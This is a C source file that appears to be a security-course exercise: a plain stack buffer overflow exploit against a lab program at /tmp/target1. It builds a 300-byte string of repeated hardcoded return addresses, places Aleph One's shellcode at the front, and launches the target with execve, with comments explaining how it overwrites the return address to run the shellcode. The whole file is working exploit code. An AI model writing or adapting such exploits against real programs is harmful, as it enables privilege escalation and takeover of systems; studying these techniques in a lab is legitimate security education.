#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define EGG_SIZE 300 /* size of exploit string, enough to overrun the 256 buffer in target1.c:foo */ 

/* 
 * Main idea of exploit:
 *     This is a plain vanilla buffer overflow exploit. 
 *
 *     We have a buffer sufficiently big to hold shellcode 
 *     and there is no bounds checking on it. We inject 
 *     the shellcode into the buffer and overwrite the return
 *     address of the function with the address of the buffer
 *     (starting point of shellcode).
 */

int main (void)
{
  char *args[3];
  char *env[1];
  long retAddr, *addrPtr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  int i;

  retAddr = 0xBFFFFC08; /* start address of buf in target1.c:foo */
  
  /* First fill the exploit string with the address of the buf in foo. 
     This will ensure that we overwrite the return address with the 
     start address of our code */
  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
    *(addrPtr++) = retAddr;
  
  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  memcpy (egg, shellcode, strlen (shellcode));

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
  
  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve (TARGET, args, env))
    fprintf (stderr, "execve failed.\n");

  return 0;
}
